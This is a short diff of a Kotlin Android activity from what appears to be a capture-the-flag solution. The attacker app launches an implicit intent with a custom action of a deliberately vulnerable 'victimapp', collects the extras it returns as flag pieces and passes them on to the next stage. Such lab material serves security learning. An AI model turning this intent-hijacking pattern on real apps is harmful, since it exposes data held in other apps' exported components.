@@ -7,18 +7,17 @@ import android.os.Bundle
 import android.widget.TextView
 import androidx.appcompat.app.AppCompatActivity
 
-class PartOne : AppCompatActivity() {
+class PartTwo : AppCompatActivity() {
+    var flag = ""
+
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_main)
 
-        val intent = Intent().apply {
-            component = ComponentName(
-                "com.example.victimapp",
-                "com.example.victimapp.PartOne"
-            )
-        }
-        startActivityForResult(intent, 1)
+        flag = intent?.getStringExtra("flag") ?: "[null]"
+
+        val sendIntent = Intent("com.example.victimapp.intent.action.JUSTASK")
+        startActivityForResult(sendIntent, 2)
     }
 
     override fun onActivityResult(requestCode: Int, resultCode: Int, intent: Intent?) {
@@ -26,14 +25,14 @@ class PartOne : AppCompatActivity() {
 
         val view = findViewById<TextView>(R.id.debug_text)
         intent?.getExtras()?.let { extras ->
-            val flagPart = extras
+            flag += extras
                 .keySet()
                 .fold("") { acc, key -> acc + extras.getCharSequence(key) }
-            view.text = flagPart
+            view.text = flag
 
             startActivity(
-                Intent(this, PartTwo::class.java)
-                    .putExtra("flag", flagPart)
+                Intent(this, PartThree::class.java)
+                    .putExtra("flag", flag)
             )
         }
     }
